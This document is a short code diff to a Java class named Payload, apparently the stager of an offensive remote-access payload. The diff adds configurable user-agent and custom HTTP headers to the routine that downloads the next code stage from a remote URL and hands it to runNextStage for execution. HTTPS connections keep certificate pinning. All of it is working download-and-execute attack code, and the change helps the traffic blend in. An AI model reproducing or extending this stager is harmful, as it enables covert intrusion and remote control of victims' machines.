@@ -29,6 +29,8 @@ public class Payload {
     private static long session_expiry;
     private static byte[] cert_hash;
     private static String stageless_class;
+    private static String user_agent;
+    private static String custom_headers;
 
     private static Object[] parameters;
 
@@ -73,6 +75,8 @@ public class Payload {
         long retryTotal = transportConfig.retry_total;
         long retryWait = transportConfig.retry_wait;
         cert_hash = transportConfig.cert_hash;
+        custom_headers = transportConfig.custom_headers;
+        user_agent = transportConfig.user_agent;
 
         while (currentTime <= payloadStart + retryTotal &&
             currentTime <= session_expiry) {
@@ -100,13 +104,12 @@ public class Payload {
 
     private static void runStageFromHTTP(String url) throws Exception {
         InputStream inStream;
+        URLConnection uc = new URL(url).openConnection();
+        HttpConnection.addRequestHeaders(uc, custom_headers, user_agent);
         if (url.startsWith("https")) {
-            URLConnection uc = new URL(url).openConnection();
             PayloadTrustManager.useFor(uc, cert_hash);
-            inStream = uc.getInputStream();
-        } else {
-            inStream = new URL(url).openStream();
         }
+        inStream = uc.getInputStream();
         OutputStream out = new ByteArrayOutputStream();
         DataInputStream in = new DataInputStream(inStream);
         runNextStage(in, out, parameters);
